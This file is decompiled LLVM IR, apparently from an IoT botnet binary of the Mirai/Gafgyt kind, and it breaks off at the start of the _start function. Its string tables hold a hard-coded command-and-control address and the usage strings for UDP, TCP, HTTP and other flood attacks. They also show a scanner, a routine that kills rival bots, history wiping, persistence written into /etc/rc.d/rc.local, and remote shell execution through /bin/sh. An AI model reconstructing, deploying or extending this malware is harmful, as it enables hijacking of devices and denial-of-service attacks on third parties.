@global_var_1c5d8.579 = constant [4 x i8] c"fin\00"
@global_var_1c5dc.581 = constant [4 x i8] c"ack\00"
@global_var_1c5e0.583 = constant [4 x i8] c"psh\00"
@global_var_1c5e4.585 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1adf8.591 = constant [5 x i8] c"mips\00"
@global_var_1ae00.592 = constant [7 x i8] c"mipsel\00"
@global_var_1ae08.593 = constant [4 x i8] c"sh4\00"
@global_var_1ae0c.594 = constant [4 x i8] c"x86\00"
@global_var_1ae10.595 = constant [5 x i8] c"i686\00"
@global_var_1ae18.596 = constant [4 x i8] c"ppc\00"
@global_var_1ae1c.597 = constant [5 x i8] c"i586\00"
@global_var_1ae24.598 = constant [8 x i8] c"jackmy*\00"
@global_var_1ae2c.599 = constant [8 x i8] c"hackmy*\00"
@global_var_1ae34.600 = constant [5 x i8] c"arm*\00"
@global_var_1ae3c.601 = constant [3 x i8] c"b1\00"
@global_var_1ae40.602 = constant [3 x i8] c"b2\00"
@global_var_1ae44.603 = constant [3 x i8] c"b3\00"
@global_var_1ae48.604 = constant [3 x i8] c"b4\00"
@global_var_1ae4c.605 = constant [3 x i8] c"b5\00"
@global_var_1ae50.606 = constant [3 x i8] c"b6\00"
@global_var_1ae54.607 = constant [3 x i8] c"b7\00"
@global_var_1ae58.608 = constant [3 x i8] c"b8\00"
@global_var_1ae5c.609 = constant [3 x i8] c"b9\00"
@global_var_1ae60.610 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_1ae74.611 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_1ae80.612 = constant [10 x i8] c"dvrHelper\00"
@global_var_1ae8c.613 = constant [8 x i8] c"FDFDHFC\00"
@global_var_1ae94.614 = constant [5 x i8] c"FEUB\00"
@global_var_1ae9c.615 = constant [9 x i8] c"FTUdftui\00"
@global_var_1aea8.616 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_1aeb4.617 = constant [6 x i8] c"jhUOH\00"
@global_var_1aebc.618 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_1aec8.619 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_1aed4.620 = constant [10 x i8] c"kmyx86_64\00"
@global_var_1aee0.621 = constant [10 x i8] c"lolmipsel\00"
@global_var_1aeec.622 = constant [8 x i8] c"RYrydry\00"
@global_var_1aef4.623 = constant [5 x i8] c"tel*\00"
@global_var_1aefc.624 = constant [9 x i8] c"TwoFace*\00"
@global_var_1af08.625 = constant [9 x i8] c"UYyuyioy\00"
@global_var_1af14.626 = constant [5 x i8] c"wget\00"
@global_var_1af1c.627 = constant [7 x i8] c"x86_64\00"
@global_var_1af24.628 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_1af30.629 = constant [5 x i8] c"xxb*\00"
@global_var_1af3c.630 = constant i32 49
@global_var_1af40.631 = constant i32 50
@global_var_1af44.632 = constant i32 51
@global_var_1af48.633 = constant i32 52
@global_var_1af4c.634 = constant i32 53
@global_var_1af50.635 = constant i32 54
@global_var_1af54.636 = constant i32 55
@global_var_1af58.637 = constant i32 56
@global_var_1af5c.638 = constant i32 57
@global_var_1af60.639 = constant [3 x i8] c"10\00"
@global_var_1af64.640 = constant [3 x i8] c"11\00"
@global_var_1af68.641 = constant [3 x i8] c"12\00"
@global_var_1af6c.642 = constant [3 x i8] c"13\00"
@global_var_1af70.643 = constant [3 x i8] c"14\00"
@global_var_1af74.644 = constant [3 x i8] c"15\00"
@global_var_1af78.645 = constant [3 x i8] c"16\00"
@global_var_1af7c.646 = constant [3 x i8] c"17\00"
@global_var_1af80.647 = constant [3 x i8] c"18\00"
@global_var_1af84.648 = constant [3 x i8] c"19\00"
@global_var_1af88.649 = constant [3 x i8] c"20\00"
@global_var_1af8c.650 = constant [6 x i8] c"hackz\00"
@global_var_1af94.651 = constant [5 x i8] c"bin*\00"
@global_var_1af9c.652 = constant [5 x i8] c"gtop\00"
@global_var_1afa4.653 = constant [5 x i8] c"ftp*\00"
@global_var_1afac.654 = constant [6 x i8] c"tftp*\00"
@global_var_1afb4.655 = constant [7 x i8] c"botnet\00"
@global_var_1afbc.656 = constant [8 x i8] c"swatnet\00"
@global_var_1afc4.657 = constant [8 x i8] c"ballpit\00"
@global_var_1afcc.658 = constant [8 x i8] c"fucknet\00"
@global_var_1afd4.659 = constant [9 x i8] c"cracknet\00"
@global_var_1afe0.660 = constant [8 x i8] c"weednet\00"
@global_var_1afe8.661 = constant [7 x i8] c"gaynet\00"
@global_var_1aff0.662 = constant [9 x i8] c"queernet\00"
@global_var_1affc.663 = constant [8 x i8] c"ballnet\00"
@global_var_1b004.664 = constant [5 x i8] c"unet\00"
@global_var_1b00c.665 = constant [7 x i8] c"yougay\00"
@global_var_1b014.666 = constant [7 x i8] c"sttftp\00"
@global_var_1b01c.667 = constant [7 x i8] c"sstftp\00"
@global_var_1b024.668 = constant [7 x i8] c"sbtftp\00"
@global_var_1b02c.669 = constant [6 x i8] c"btftp\00"
@global_var_1b034.670 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_1b040.671 = constant [6 x i8] c"bruv*\00"
@global_var_1b048.672 = constant [5 x i8] c"IoT*\00"
@global_var_1b050.673 = constant [16 x i8] c"208.67.1.179:23\00"
@global_var_262c4.674 = global [87 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1adf8.591, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ae00.592, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ae08.593, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ae0c.594, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ae10.595, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ae18.596, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ae1c.597, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ae1c.597, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ae24.598, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ae2c.599, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ae34.600, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ae3c.601, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ae40.602, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ae44.603, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ae48.604, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ae4c.605, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ae50.606, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ae54.607, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ae58.608, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1ae5c.609, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1ae60.610, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ae74.611, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ae80.612, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1ae8c.613, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ae94.614, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ae9c.615, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aea8.616, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1aeb4.617, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aebc.618, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1aec8.619, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1aed4.620, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1aee0.621, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1adf8.591, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ae00.592, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aeec.622, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1aef4.623, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aefc.624, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1af08.625, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1af14.626, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1af1c.627, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1af24.628, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1af30.629, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1af38.41, i32 0, i32 0), i8* bitcast (i32* @global_var_1af3c.630 to i8*), i8* bitcast (i32* @global_var_1af40.631 to i8*), i8* bitcast (i32* @global_var_1af44.632 to i8*), i8* bitcast (i32* @global_var_1af48.633 to i8*), i8* bitcast (i32* @global_var_1af4c.634 to i8*), i8* bitcast (i32* @global_var_1af50.635 to i8*), i8* bitcast (i32* @global_var_1af54.636 to i8*), i8* bitcast (i32* @global_var_1af58.637 to i8*), i8* bitcast (i32* @global_var_1af5c.638 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1af60.639, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1af64.640, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1af68.641, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1af6c.642, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1af70.643, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1af74.644, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1af78.645, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1af7c.646, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1af80.647, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1af84.648, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1af88.649, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1af8c.650, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1af94.651, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1af9c.652, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1afa4.653, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1afac.654, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1afb4.655, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1afbc.656, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1afc4.657, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1afcc.658, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1afd4.659, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1afe0.660, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1afe8.661, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aff0.662, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1affc.663, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b004.664, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b00c.665, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b014.666, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b01c.667, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1b024.668, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b02c.669, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1b034.670, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b040.671, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1b048.672, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1b050.673, i32 0, i32 0)]
@global_var_1c610.680 = constant i32 34
@global_var_1c614.682 = constant [22 x i8] c"history -c;history -w\00"
@global_var_1c62c.684 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_1c64c.686 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_1c68c.688 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_1c6cc.689 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_1c70c.690 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_1c79c.691 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_1c7d4.692 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_1c7f4.693 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_1c80c.694 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_1c664.703 = constant [6 x i8] c"close\00"
@global_var_1c66c.704 = constant [11 x i8] c"keep-alive\00"
@global_var_1c678.705 = constant [7 x i8] c"accept\00"
@global_var_1c680.706 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1c664.703, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1c66c.704, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1c678.705, i32 0, i32 0)]
@global_var_1c880.710 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_1c8d0.716 = constant [3 x i8*] [i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1c7d4.692, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1c7f4.693, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_1c80c.694, i32 0, i32 0)]
@global_var_1c8dc.720 = constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00"
@global_var_1c91c.724 = constant [6 x i8] c"PONG!\00"
@global_var_1c924.726 = constant [6 x i8] c"TABLE\00"
@global_var_1c92c.728 = constant [3 x i8] c"%d\00"
@global_var_1c930.730 = constant [8 x i8] c"SCANNER\00"
@global_var_1c938.732 = constant [4 x i8] c"OFF\00"
@global_var_2cae8.734 = global i32 0
@global_var_1c93c.736 = constant [17 x i8] c"STOPPING SCANNER\00"
@global_var_1c950.738 = constant [3 x i8] c"ON\00"
@global_var_1c954.741 = constant [26 x i8] c"STARTING SCANNER ON -> %s\00"
@global_var_1c970.743 = constant [8 x i8] c"REMOVER\00"
@global_var_1c978.745 = constant [29 x i8] c"COMMENCING BOT KILL ON -> %s\00"
@global_var_1c998.747 = constant [12 x i8] c"GETPUBLICIP\00"
@global_var_1c9a4.749 = constant [17 x i8] c"My Public IP: %s\00"
@global_var_1c9b8.751 = constant [4 x i8] c"UDP\00"
@global_var_1c9bc.753 = constant [113 x i8] c"UDP <target> <port (0 for random)> <time> <netmask> <packet size> <poll interval> <sleep check> <sleep time(ms)>\00"
@global_var_1ca30.756 = constant [4 x i8] c"TCP\00"
@global_var_1ca34.758 = constant [186 x i8] c"TCP <target> <port (0 for random)> <time> <netmask (32 for non spoofed)> <flags (syn, ack, psh, rst, fin, all) comma seperated> (packet size, usually 0) (time poll interval, default 10)\00"
@global_var_1caf0.760 = constant [5 x i8] c"HTTP\00"
@global_var_1caf8.762 = constant [10 x i8] c"HTTPFLOOD\00"
@global_var_1cb04.764 = constant [4 x i8] c"CNC\00"
@global_var_1cb08.766 = constant [27 x i8] c"CNC <target> <port> <time>\00"
@global_var_1cb24.768 = constant [4 x i8] c"STD\00"
@global_var_1cb28.770 = constant [27 x i8] c"STD <target> <port> <time>\00"
@global_var_1cb44.772 = constant [9 x i8] c"KILLATTK\00"
@global_var_1cb50.776 = constant [11 x i8] c"Killed %d.\00"
@global_var_1cb5c.778 = constant [13 x i8] c"None Killed.\00"
@global_var_1cb6c.780 = constant [10 x i8] c"LOLNOGTFO\00"
@global_var_26420.783 = local_unnamed_addr global i32 -1
@global_var_2641c.785 = global [16 x i8]* @global_var_1b050.673
@global_var_1cb78.787 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1cb80.790 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1cb90.792 = constant [11 x i8] c"\0900000000\09\00"
@global_var_26874.794 = global i32 0
@global_var_1cb9c.796 = constant [9 x i8] c"TOXICNET\00"
@global_var_1cba8.798 = constant i32 0
@global_var_1cbac.800 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@1 = constant i32 114
@global_var_1cbc4.804 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1cbd4.806 = constant i32 47
@global_var_1cbd8.808 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_1cbe0.810 = constant i32 97
@global_var_1cbe4.812 = constant [13 x i8] c"fork failed\0A\00"
@global_var_1cbf4.816 = constant [12 x i8] c"BUILD %s:%s\00"
@global_var_1cc00.821 = constant [5 x i8] c"PONG\00"
@global_var_1cc08.823 = constant [4 x i8] c"DUP\00"
@global_var_1cc0c.825 = constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00"
@global_var_1cc20.827 = constant [3 x i8] c"SH\00"
@global_var_1cc24.829 = constant [8 x i8] c"%s 2>&1\00"
@global_var_1cc2c.831 = constant [3 x i8] c"%s\00"
@global_var_1cc30.833 = constant i32 32
@global_var_2caa8.835 = global i32 0
@global_var_264e8 = external global i32
@global_var_264f0 = external local_unnamed_addr global i32
@global_var_2cab8.845 = global i32 0
@global_var_26524.851 = global i32 0
@global_var_2a884.853 = global i32 0
@global_var_15f30.855 = constant i32 -481296384
@global_var_1342c.856 = constant i32 -442564544
@global_var_2a888.858 = global i32 0
@global_var_2653c.864 = global i32 2
@global_var_2650c.870 = global i32 0
@global_var_137e4.871 = constant i32 -442564492
@global_var_26508.873 = global i32* bitcast (i8** @global_var_26540.840 to i32*)
@global_var_1d234.879 = constant i32 0
@global_var_139a4.884 = constant i32 -382910448
@global_var_17718.885 = constant i32 -382909968
@global_var_177d4.886 = constant i32 -382910224
@global_var_1d268.888 = constant i32 135270416
@global_var_1d24c.890 = constant [6 x i8] c"(nil)\00"
@global_var_1d254.893 = constant [7 x i8] c"(null)\00"
@global_var_1d25c.895 = constant i32 2949163
@global_var_1d2e8.898 = constant i32 16843008
@global_var_1d2d0.900 = constant i32 327688
@global_var_1d2c8.905 = constant [8 x i8] c" +0-#'I\00"
@global_var_1d270.907 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1d2b0.909 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1d2a3.911 = constant i32 117506048
@global_var_1d2a4.913 = constant i32 252117248
@global_var_1d294.915 = constant i32 331776
@global_var_1d284.917 = constant i32 335616
@global_var_14efc.949 = constant i32 -456978431
@global_var_1d304.955 = constant [8 x i8] c"Success\00"
@global_var_1d2f4.957 = constant [15 x i8] c"Unknown error \00"
@global_var_1dfa2.959 = constant i32 65536
@global_var_26824.960 = global i32* @global_var_1dfa2.959
@global_var_2c88c.963 = global i32 0
@global_var_2c890.966 = global i32 0
@global_var_2ca6c.968 = global i32 0
@global_var_2c8a0.970 = global i32 0
@global_var_2682c.972 = global i32 0
@global_var_2cba4.977 = global i32 0
@global_var_2cb98.980 = global i32 0
@global_var_2caf0.982 = global i32 0
@global_var_2ca80.984 = global i32 0
@global_var_2672c.987 = global i32 256
@global_var_26630.988 = global i32* @global_var_2672c.987
@global_var_2cb70.992 = global i32 0
@global_var_1755c.993 = constant i32 -382910416
@global_var_15fb0.1000 = constant i32 -442564520
@global_var_26738.1006 = global i32 0
@global_var_131f8.1008 = constant i32 -481230848
@global_var_2ca98.1010 = global i32 0
@global_var_12de4.1012 = constant i32 -509587456
@global_var_26750.1014 = global i32 0
@global_var_26768 = external global i32
@global_var_26788.1020 = global i32 -1726662223
@global_var_26770.1027 = local_unnamed_addr global i32* @global_var_26788.1020
@global_var_2676c.1029 = global i32* @global_var_26788.1020
@global_var_1de60.1043 = constant i32 0
@global_var_1de88.1050 = constant [8 x i8] c"/bin/sh\00"
@global_var_1de90.1052 = constant [3 x i8] c"sh\00"
@global_var_1de94.1054 = constant [3 x i8] c"-c\00"
@global_var_26804.1058 = global i32 0
@global_var_2ca9c.1062 = local_unnamed_addr global i32 0
@global_var_138ec.1065 = constant i32 -382910416
@global_var_2caa4.1067 = global i32 0
@global_var_262a0.1071 = global i32 -1
@global_var_2caac.1074 = global i32 0
@global_var_2cab0.1076 = local_unnamed_addr global i32 0
@global_var_17020.1077 = constant i32 -390234096
@global_var_1de98.1079 = constant [10 x i8] c"/dev/null\00"
@global_var_2cab4.1081 = global i32 0
@global_var_1386c.1085 = constant i32 -382909968
@global_var_2caa0.1087 = local_unnamed_addr global i32 0
@global_var_14e70.1090 = constant [3 x i8] c"J\0D\00"
@global_var_2681c = external local_unnamed_addr global i32
@global_var_132f8.1101 = constant i32 -442564608
@global_var_172e8.1103 = constant i32 -335544720
@global_var_17420.1106 = constant i32 -275775369
@global_var_2cadc.1108 = global i32 0
@global_var_2cabc.1110 = global i32 0
@global_var_1e1a4.1112 = constant [4 x i8] c"inf\00"
@global_var_1e1a7.1116 = constant i32 1179535616
@global_var_1e1b4.1118 = constant i32 2883630
@global_var_14af8.1120 = constant i32 -382908944
@global_var_2cac0.1128 = global i32 0
@global_var_2cad8.1133 = local_unnamed_addr global i32 0
@global_var_12e38.1138 = constant i32 -382910448
@global_var_2cba8.1141 = global i32 0
@global_var_1e200.1143 = constant i32 46
@global_var_2cb88.1145 = global i32 0
@global_var_19224.1147 = constant i32 -369098656
@global_var_1e204.1154 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1e218.1156 = constant i32 114
@global_var_1e21c.1158 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1e234.1161 = constant [11 x i8] c"nameserver\00"
@global_var_1e240.1164 = constant [7 x i8] c"domain\00"
@global_var_1e248.1166 = constant [7 x i8] c"search\00"
@global_var_2cbac.1171 = global i32 0
@global_var_2cbb0.1173 = global i32 0
@global_var_1e264.1182 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1e250.1184 = constant i32 0
@global_var_1e278.1187 = constant [3 x i8] c"%x\00"
@global_var_1e27c.1190 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1e288.1192 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_262a4.1196 = global i32 0
@global_var_26848.5 = external global i8*
@global_var_2687d.82 = local_unnamed_addr global i8 0
@global_var_2687e.83 = local_unnamed_addr global i8 0
@2 = internal constant [3 x i8] c" \01\00"
@global_var_26540.840 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_26590.841 = local_unnamed_addr global i8 16
@global_var_17034.847 = constant i8 0
@global_var_26541.876 = local_unnamed_addr global i8 1
@global_var_26591.877 = local_unnamed_addr global i8 1
@3 = internal constant [2 x i8] c"\01\00"
@global_var_26828.1135 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_26829.1136 = local_unnamed_addr global i8 0
@global_var_1cbc0.802 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_26848.5 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_26848.5 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_262bc.8 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_262bc.8 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_262bc.8 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_262bc.8 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_26848.5 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_262bc.8, { 1, 0 }
  uselistorder i8** @global_var_26848.5, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_262b0.18, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_262b0.18 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_262b0.18 to i32)

; uselistorder directives
  uselistorder i32* @global_var_262b0.18, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
